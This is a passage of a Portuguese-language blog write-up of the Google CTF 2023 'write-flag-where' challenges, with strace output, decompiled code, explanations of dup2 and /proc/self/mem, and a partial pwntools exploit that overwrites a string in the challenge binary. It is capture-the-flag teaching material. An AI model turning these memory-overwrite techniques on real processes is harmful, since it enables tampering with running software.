<html>

<head>
  <title>retr0.zip</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="../../style/main.css">
  <link rel="stylesheet" href="../../style/post.css">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>

  <script>
    hljs.highlightAll();
    window.onload = () => {
      const dateDocument = document.querySelector('blockquote > p');
      const dateString = new Date(dateDocument.innerText).toLocaleDateString(navigator.language, { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })
      dateDocument.innerText = dateString;
    }
  </script>
</head>

<body>
  <div class="center-container"><h1 id="google-ctf-writeups">Google CTF writeups</h1>
<blockquote>
<p>06/26/2023</p>
</blockquote>
<h1 id="write-flag-where23">Write-flag-where{,2,3}</h1>
<p>Os três challenges são variações de um mesmo binário, com uma ideia
interessante, podemos escrever o conteúdo da flag em qualquer lugar do
binário, e a dificuldade de conseguir exibir a flag aumenta
gradualmente.</p>
<h2 id="first-challenge">First Challenge</h2>
<p>Não recebemos o source do binário e ao executar ele parece não fazer
nada, vamos para uma analise simples.</p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwnmachine:~$</span> strace ./chal</span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">execve</span><span class="er">(</span><span class="st">&quot;./chal&quot;</span><span class="ex">,</span> <span class="pp">[</span><span class="st">&quot;./chal&quot;</span><span class="pp">]</span>, 0x7ffc7c2c8af0 /<span class="pp">*</span> 72 vars <span class="pp">*</span>/<span class="kw">)</span> <span class="ex">=</span> 0</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">openat</span><span class="er">(</span><span class="ex">AT_FDCWD,</span> <span class="st">&quot;/proc/self/maps&quot;</span>, O_RDONLY<span class="kw">)</span> <span class="ex">=</span> 3</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="bu">read</span><span class="er">(</span><span class="ex">3,</span> <span class="st">&quot;55fc9bd98000-55fc9bd99000 r--p 0&quot;</span>..., 4096<span class="kw">)</span> <span class="ex">=</span> 2607</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">close</span><span class="er">(</span><span class="ex">3</span><span class="kw">)</span>                                <span class="ex">=</span> 0</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">openat</span><span class="er">(</span><span class="ex">AT_FDCWD,</span> <span class="st">&quot;./flag.txt&quot;</span>, O_RDONLY<span class="kw">)</span> <span class="ex">=</span> 3</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="bu">read</span><span class="er">(</span><span class="ex">3,</span> <span class="st">&quot;CTF{fake-flag}\n&quot;</span>, 128<span class="kw">)</span>        <span class="ex">=</span> 15</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="ex">close</span><span class="er">(</span><span class="ex">3</span><span class="kw">)</span>                                <span class="ex">=</span> 0</span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="ex">dup2</span><span class="er">(</span><span class="ex">1,</span> 1337<span class="kw">)</span>                           <span class="ex">=</span> <span class="at">-1</span> EBADF <span class="er">(</span><span class="ex">Bad</span> file descriptor<span class="kw">)</span></span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">openat</span><span class="er">(</span><span class="ex">AT_FDCWD,</span> <span class="st">&quot;/dev/null&quot;</span>, O_RDWR<span class="kw">)</span>   <span class="ex">=</span> 3</span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ex">dup2</span><span class="er">(</span><span class="ex">3,</span> 0<span class="kw">)</span>                              <span class="ex">=</span> 0</span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="ex">dup2</span><span class="er">(</span><span class="ex">3,</span> 1<span class="kw">)</span>                              <span class="ex">=</span> 1</span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">dup2</span><span class="er">(</span><span class="ex">3,</span> 2<span class="kw">)</span>                              <span class="ex">=</span> 2</span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="ex">close</span><span class="er">(</span><span class="ex">3</span><span class="kw">)</span>                                <span class="ex">=</span> 0</span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="ex">alarm</span><span class="er">(</span><span class="ex">60</span><span class="kw">)</span>                               <span class="ex">=</span> 0</span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="ex">lseek</span><span class="er">(</span><span class="ex">-1,</span> 0, SEEK_CUR<span class="kw">)</span>                  <span class="ex">=</span> <span class="at">-1</span> EBADF <span class="er">(</span><span class="ex">Bad</span> file descriptor<span class="kw">)</span></span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="ex">lseek</span><span class="er">(</span><span class="ex">-1,</span> 0, SEEK_CUR<span class="kw">)</span>                  <span class="ex">=</span> <span class="at">-1</span> EBADF <span class="er">(</span><span class="ex">Bad</span> file descriptor<span class="kw">)</span></span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="ex">lseek</span><span class="er">(</span><span class="ex">-1,</span> 0, SEEK_CUR<span class="kw">)</span>                  <span class="ex">=</span> <span class="at">-1</span> EBADF <span class="er">(</span><span class="ex">Bad</span> file descriptor<span class="kw">)</span></span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="bu">read</span><span class="er">(</span><span class="ex">-1,</span> 0x7ffccb5a3300, 64<span class="kw">)</span>            <span class="ex">=</span> <span class="at">-1</span> EBADF <span class="er">(</span><span class="ex">Bad</span> file descriptor<span class="kw">)</span></span>
<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="ex">exit_group</span><span class="er">(</span><span class="ex">0</span><span class="kw">)</span>                           <span class="ex">=</span> <span class="pp">?</span></span>
<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="ex">+++</span> exited with 0 +++</span></code></pre></div>
<p>Apenas dando uma olhada para o output do strace podemos entender oque
está acontecendo, o binario faz <em>open</em> de
<code>/proc/self/maps</code>, <code>./flag.txt</code> e
<code>/dev/null</code>, executa <code>dup2(stdout, 1337)</code> e
<code>dup2(dev_null_fd, {0,1,3})</code>, o erro está no
<code>dup2 1337</code>, podemos ver o retorno de “Bad file descriptor”,
isso acontece por que por padrão não podemos ter fd’s maiores que 1024,
mas podemos alterar isso com: <code>ulimit -n 2048</code>.</p>
<p>Reexecutando o binário agora teremos isso:</p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwnmachine:~$</span> ./chal</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">This</span> challenge is not a classical pwn</span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">In</span> order to solve it will take skills of your own</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">An</span> excellent primitive you get for free</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Choose</span> an address and I will write what I see</span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">But</span> the author is cursed or perhaps it<span class="st">&#39;s just out of spite</span></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="st">For the flag that you seek is the thing you will write</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="st">ASLR isn&#39;</span>t the challenge so I<span class="st">&#39;ll tell you what</span></span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="st">I&#39;</span>ll give you my mappings so that you<span class="st">&#39;ll have a shot.</span></span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="st">559ce12ba000-559ce12bb000 r--p 00000000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal</span></span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="st">559ce12bb000-559ce12bc000 r-xp 00001000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal</span></span>
<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="st">559ce12bc000-559ce12bd000 r--p 00002000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal</span></span>
<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="st">559ce12bd000-559ce12be000 r--p 00002000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal</span></span>
<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a><span class="st">559ce12be000-559ce12bf000 rw-p 00003000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal</span></span>
<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="st">559ce12bf000-559ce12c0000 rw-p 00000000 00:00 0 </span></span>
<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="st">559ce12c0000-559ce12c1000 rw-p 00005000 103:02 7733639                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/chal</span></span>
<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b091000-7f3a6b094000 rw-p 00000000 00:00 0 </span></span>
<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b094000-7f3a6b0bc000 r--p 00000000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6</span></span>
<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b0bc000-7f3a6b251000 r-xp 00028000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6</span></span>
<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b251000-7f3a6b2a9000 r--p 001bd000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6</span></span>
<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b2a9000-7f3a6b2ad000 r--p 00214000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6</span></span>
<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b2ad000-7f3a6b2af000 rw-p 00218000 103:02 7733637                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/libc.so.6</span></span>
<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b2af000-7f3a6b2be000 rw-p 00000000 00:00 0 </span></span>
<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b2be000-7f3a6b2c0000 r--p 00000000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so</span></span>
<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b2c0000-7f3a6b2ea000 r-xp 00002000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so</span></span>
<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b2ea000-7f3a6b2f5000 r--p 0002c000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so</span></span>
<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b2f6000-7f3a6b2f8000 r--p 00037000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so</span></span>
<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a><span class="st">7f3a6b2f8000-7f3a6b2fa000 rw-p 00039000 103:02 7733638                   /home/r3tr0/ctf/gctf/pwn/write-flag-where/ld-2.35.so</span></span>
<span id="cb2-29"><a href="#cb2-29" aria-hidden="true" tabindex="-1"></a><span class="st">7ffc1e28c000-7ffc1e2ad000 rw-p 00000000 00:00 0                          [stack]</span></span>
<span id="cb2-30"><a href="#cb2-30" aria-hidden="true" tabindex="-1"></a><span class="st">7ffc1e2b4000-7ffc1e2b8000 r--p 00000000 00:00 0                          [vvar]</span></span>
<span id="cb2-31"><a href="#cb2-31" aria-hidden="true" tabindex="-1"></a><span class="st">7ffc1e2b8000-7ffc1e2ba000 r-xp 00000000 00:00 0                          [vdso]</span></span>
<span id="cb2-32"><a href="#cb2-32" aria-hidden="true" tabindex="-1"></a><span class="st">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]</span></span>
<span id="cb2-33"><a href="#cb2-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-34"><a href="#cb2-34" aria-hidden="true" tabindex="-1"></a><span class="st">Give me an address and a length just so:</span></span>
<span id="cb2-35"><a href="#cb2-35" aria-hidden="true" tabindex="-1"></a><span class="st">&lt;address&gt; &lt;length&gt;</span></span>
<span id="cb2-36"><a href="#cb2-36" aria-hidden="true" tabindex="-1"></a><span class="st">And I&#39;</span>ll write it wherever you want it to go.</span>
<span id="cb2-37"><a href="#cb2-37" aria-hidden="true" tabindex="-1"></a><span class="ex">If</span> an exit is all that you desire</span>
<span id="cb2-38"><a href="#cb2-38" aria-hidden="true" tabindex="-1"></a><span class="ex">Send</span> me nothing and I will happily expire</span></code></pre></div>
<p>Neste momento vamos fazer reversing para entender melhor:</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// extracted from ida64 with renamed vars</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>  close<span class="op">(</span>flag_fd<span class="op">);</span></span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  new_stdout <span class="op">=</span> dup2<span class="op">(</span><span class="dv">1</span><span class="op">,</span> <span class="dv">1337</span><span class="op">);</span></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>  dev_null_fd <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/dev/null&quot;</span><span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>  dup2<span class="op">(</span>dev_null_fd<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>  dup2<span class="op">(</span>dev_null_fd<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>  dup2<span class="op">(</span>dev_null_fd<span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>  close<span class="op">(</span>dev_null_fd<span class="op">);</span></span>
<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>  alarm<span class="op">(</span><span class="dv">60</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>  dprintf<span class="op">(</span>new_stdout<span class="op">,</span></span>
<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;This challenge is not a classical pwn</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;In order to solve it will take skills of your own</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;An excellent primitive you get for free</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;Choose an address and I will write what I see</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;But the author is cursed or perhaps it&#39;s just out of spite</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;For the flag that you seek is the thing you will write</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;ASLR isn&#39;t the challenge so I&#39;ll tell you what</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;I&#39;ll give you my mappings so that you&#39;ll have a shot.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>  dprintf<span class="op">(</span>new_stdout<span class="op">,</span> <span class="st">&quot;</span><span class="sc">%s\n\n</span><span class="st">&quot;</span><span class="op">,</span> maps<span class="op">);</span></span>
<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>  <span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>    dprintf<span class="op">(</span>new_stdout<span class="op">,</span></span>
<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Give me an address and a length just so:</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;&lt;address&gt; &lt;length&gt;</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;And I&#39;ll write it wherever you want it to go.</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;If an exit is all that you desire</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Send me nothing and I will happily expire</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a>    buf<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a>    buf<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a>    buf<span class="op">[</span><span class="dv">2</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a>    buf<span class="op">[</span><span class="dv">3</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a>    buf<span class="op">[</span><span class="dv">4</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a>    buf<span class="op">[</span><span class="dv">5</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a>    buf<span class="op">[</span><span class="dv">6</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a>    buf<span class="op">[</span><span class="dv">7</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a>    nr <span class="op">=</span> read<span class="op">(</span>new_stdout<span class="op">,</span> buf<span class="op">,</span> <span class="dv">64</span><span class="bu">u</span><span class="op">);</span></span>
<span id="cb3-37"><a href="#cb3-37" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">((</span><span class="dt">unsigned</span> <span class="dt">int</span><span class="op">)</span>__isoc99_sscanf<span class="op">(</span>buf<span class="op">,</span> <span class="st">&quot;0x</span><span class="sc">%llx</span><span class="st"> </span><span class="sc">%u</span><span class="st">&quot;</span><span class="op">,</span> <span class="op">&amp;</span>n<span class="op">[</span><span class="dv">1</span><span class="op">],</span> n<span class="op">)</span> <span class="op">!=</span> <span class="dv">2</span> <span class="op">||</span></span>
<span id="cb3-38"><a href="#cb3-38" aria-hidden="true" tabindex="-1"></a>        n<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">&gt;</span> <span class="dv">127</span><span class="bu">u</span><span class="op">)</span></span>
<span id="cb3-39"><a href="#cb3-39" aria-hidden="true" tabindex="-1"></a>      <span class="cf">break</span><span class="op">;</span></span>
<span id="cb3-40"><a href="#cb3-40" aria-hidden="true" tabindex="-1"></a>    v6 <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/proc/self/mem&quot;</span><span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
<span id="cb3-41"><a href="#cb3-41" aria-hidden="true" tabindex="-1"></a>    lseek64<span class="op">(</span>v6<span class="op">,</span> <span class="op">*(</span>__off64_t <span class="op">*)&amp;</span>n<span class="op">[</span><span class="dv">1</span><span class="op">],</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb3-42"><a href="#cb3-42" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span>v6<span class="op">,</span> <span class="op">&amp;</span>flag_buf<span class="op">,</span> n<span class="op">[</span><span class="dv">0</span><span class="op">]);</span></span>
<span id="cb3-43"><a href="#cb3-43" aria-hidden="true" tabindex="-1"></a>    close<span class="op">(</span>v6<span class="op">);</span></span>
<span id="cb3-44"><a href="#cb3-44" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb3-45"><a href="#cb3-45" aria-hidden="true" tabindex="-1"></a>  exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
<span id="cb3-46"><a href="#cb3-46" aria-hidden="true" tabindex="-1"></a><span class="op">...</span></span></code></pre></div>
<p>O código ira ler do usuário um endereço(addr) e um tamanho(num) e
depois escrever <strong><em>num</em></strong> bytes da flag no endereço
****addr****.</p>
<p>Vamos para uma rápida explicação sobre <code>dup2</code> e
<code>/proc/self/mem</code></p>
<h3 id="dup2">dup2</h3>
<p>A syscall dup2 é usada para clonar um fd, ela é bem simples com um
uso interessante, então no nosso exemplo a chamada
<code>dup2(1, 1337);</code> ira criar uma cópia do stdout para o fd
1337, então ao fazer <code>write(1337, buf, n);</code> o resultado será
escrito no <em>stdout</em>, o mesmo acontece com o
<code>dup2(dev_null_fd, 1);</code>, estamos sobrescrevendo o fd padrão
do stdout para o fd do <code>/dev/null</code>.</p>
<p>Podemos ver todas as alterações em
<code>/proc/&lt;pid&gt;/fd</code>:</p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwnmachine:~$</span> ls <span class="at">-la</span> /proc/<span class="va">$(</span><span class="ex">pgrep</span> chal<span class="va">)</span>/fd</span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 0</span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">dr-x------</span> 2 r3tr0 r3tr0  0 jun 25 17:09 .</span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">dr-xr-xr-x</span> 9 r3tr0 r3tr0  0 jun 25 17:08 ..</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwx------</span> 1 r3tr0 r3tr0 64 jun 25 17:09 0 <span class="at">-</span><span class="op">&gt;</span> /dev/null</span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwx------</span> 1 r3tr0 r3tr0 64 jun 25 17:09 1 <span class="at">-</span><span class="op">&gt;</span> /dev/null</span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwx------</span> 1 r3tr0 r3tr0 64 jun 25 17:09 1337 <span class="at">-</span><span class="op">&gt;</span> /dev/pts/0</span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwx------</span> 1 r3tr0 r3tr0 64 jun 25 17:09 2 <span class="at">-</span><span class="op">&gt;</span> /dev/null</span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="ex">lrwx------</span> 1 r3tr0 r3tr0 64 jun 25 17:09 4 <span class="at">-</span><span class="op">&gt;</span> <span class="st">&#39;socket:[40316]&#39;</span></span></code></pre></div>
<h3 id="procselfmem">/proc/self/mem</h3>
<p>Esse pseudoarquivo do proc filesystem mapeia a memória do seu
processo, então podemos ler diretamente o binario que está carregado em
memória e também editá-lo, e não existem permissões ou restrições de
memória, como “read only memory” ou “read/exec memory”, podemos
sobrescrever qualquer coisa dentro do binário em memória escrevendo
nesse arquivo, inclusive a .text ou .rodata.</p>
<hr />
<p>Com isso falado, já fica mais claro oque temos que fazer, neste
primeiro challenge, a única coisa que precisamos fazer é escrever a flag
por cima da string “Give me an address and a length just so”,
exploit:</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode python"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co"># pwn template ./chal --host wfw1.2023.ctfcompetition.com --port 1337</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>...</span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>io <span class="op">=</span> start()</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>io.recvuntil(<span class="st">b&quot;I&#39;ll give you my mappings so that you&#39;ll have a shot.&quot;</span>)</span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>maps <span class="op">=</span> io.recvuntil(<span class="st">b&#39;</span><span class="ch">\n\n</span><span class="st">&#39;</span>)</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>elf_base <span class="op">=</span> parse_maps(maps)</span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Elf base: &#39;</span> <span class="op">+</span> <span class="bu">hex</span>(elf_base))</span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>pause()</span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>io.recvuntil(<span class="st">b&#39;Send me nothing and I will happily expire&#39;</span>)</span>
<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>string_addr <span class="op">=</span> elf_base <span class="op">+</span> <span class="bn">0x21e0</span></span>
<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>io.sendline(<span class="ss">f&#39;</span><span class="sc">{</span><span class="bu">hex</span>(string_addr)<span class="sc">}</span><span class="ss"> 100&#39;</span>.encode())</span>
